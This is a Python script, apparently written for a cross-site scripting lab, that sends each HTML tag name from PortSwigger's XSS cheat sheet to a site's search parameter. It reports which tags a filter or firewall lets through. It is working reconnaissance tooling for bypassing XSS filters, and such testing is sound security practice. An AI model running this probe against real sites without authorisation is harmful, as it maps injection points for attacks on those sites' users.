import requests
import sys

site = sys.argv[1]
url_template = f'https://{site}/?search=<{{}}>'
allowed_tags = []

# Pulled from PortSwigger's XSS cheat sheet (shortened for speed, expand if needed)
tags = ['a', 'a2', 'abbr', 'acronym', 'address', 'animate', 'animatemotion', 'animatetransform', 'applet', 'area', 'article', 'aside', 'audio', 'audio2', 
        'b', 'bdi', 'bdo', 'big', 'blink', 'blockquote', 'body', 'br', 'button', 'canvas', 'caption', 'center', 'cite', 'code', 'col', 'colgroup', 'command', 
        'content', 'custom tags', 'data', 'datalist', 'dd', 'del', 'details', 'dfn', 'dialog', 'dir', 'div', 'dl', 'dt', 'element', 'em', 'embed', 'fieldset', 
        'figcaption', 'figure', 'font', 'footer', 'form', 'frame', 'frameset', 'h1', 'head', 'header', 'hgroup', 'hr', 'html', 'i', 'iframe', 'iframe2', 'image', 
        'image2', 'image3', 'img', 'img2', 'input', 'input2', 'input3', 'input4', 'ins', 'kbd', 'keygen', 'label', 'legend', 'li', 'link', 'listing', 'main', 'map', 
        'mark', 'marquee', 'menu', 'menuitem', 'meta', 'meter', 'multicol', 'nav', 'nextid', 'nobr', 'noembed', 'noframes', 'noscript', 'object', 'ol', 'optgroup', 
        'option', 'output', 'p', 'param', 'picture', 'plaintext', 'pre', 'progress', 'q', 'rb', 'rp', 'rt', 'rtc', 'ruby', 's', 'samp', 'script', 'section', 'select', 
        'set', 'shadow', 'slot', 'small', 'source', 'spacer', 'span', 'strike', 'strong', 'style', 'sub', 'summary', 'sup', 'svg', 'table', 'tbody', 'td', 'template', 
        'textarea', 'tfoot', 'th', 'thead', 'time', 'title', 'tr', 'track', 'tt', 'u', 'ul', 'var', 'video', 'video2', 'wbr', 'xmp']

for tag in tags:
    test_url = url_template.format(tag)
    resp = requests.get(test_url)
    if resp.status_code == 200:
        print(f"[+] Allowed tag: <{tag}>")
        allowed_tags.append(tag)
    else:
        print(f"[-] Blocked tag: <{tag}> with status {resp.status_code}")

print("\n=== Allowed Tags ===")
print(allowed_tags)